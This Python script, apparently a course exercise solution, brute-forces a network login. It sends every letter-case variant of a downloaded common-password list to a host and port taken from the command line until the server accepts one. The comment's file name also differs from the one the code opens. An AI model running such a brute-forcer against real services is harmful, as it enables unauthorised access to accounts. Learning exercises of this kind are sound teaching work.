# before running the program, download the file used below from here:
#       https://stepik.org/media/attachments/lesson/255258/passwords.txt
# then save it as passwords.txt and upload it to the same directory of execution

import socket
import sys
import itertools as it

with socket.socket() as s, open("password.txt") as pwd_file:
    
    hostname, port = sys.argv[1:]
    s.connect((hostname, int(port)))

    pwd_list = pwd_file.read().split('\n')

    for pwd in pwd_list:
        pwds = (''.join(p) for p in it.product(
                *zip(pwd.lower(), pwd.upper())
        ))

        for p in pwds:
            s.send(p.encode())

            if s.recv(1024) == b'Connection success!':
                print(p)
                exit()
